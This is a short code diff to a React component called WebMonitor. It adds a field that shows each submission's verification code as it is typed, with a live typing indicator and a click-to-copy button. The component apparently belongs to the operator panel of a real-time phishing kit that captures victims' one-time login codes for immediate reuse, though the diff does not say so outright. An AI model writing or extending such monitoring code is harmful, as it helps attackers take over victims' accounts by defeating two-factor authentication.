@@ -593,6 +593,23 @@ export function WebMonitor() {
                         )}
                       </span>
                     </div>
+
+                    <div
+                      className={`text-sm font-mono border rounded px-2 py-1 min-w-[60px] transition-all duration-75 cursor-pointer hover:bg-blue-50 ${
+                        isFieldTyping(submission.id, 'verificationCode')
+                          ? 'border-green-400 bg-green-50 shadow-md ring-2 ring-green-200 scale-[1.02]'
+                          : 'border-gray-300 bg-gray-50'
+                      }`}
+                      onClick={() => copyToClipboard(getFieldValue(submission.id, 'verificationCode'))}
+                      title="点击复制验证码"
+                    >
+                      <span className="relative">
+                        {getFieldValue(submission.id, 'verificationCode')}
+                        {isFieldTyping(submission.id, 'verificationCode') && (
+                          <span className="inline-block w-0.5 h-4 bg-green-500 ml-0.5 animate-ping absolute"></span>
+                        )}
+                      </span>
+                    </div>
                   </div>
                 ) : (
                   <div className="flex items-center justify-center py-4 mb-0.5">
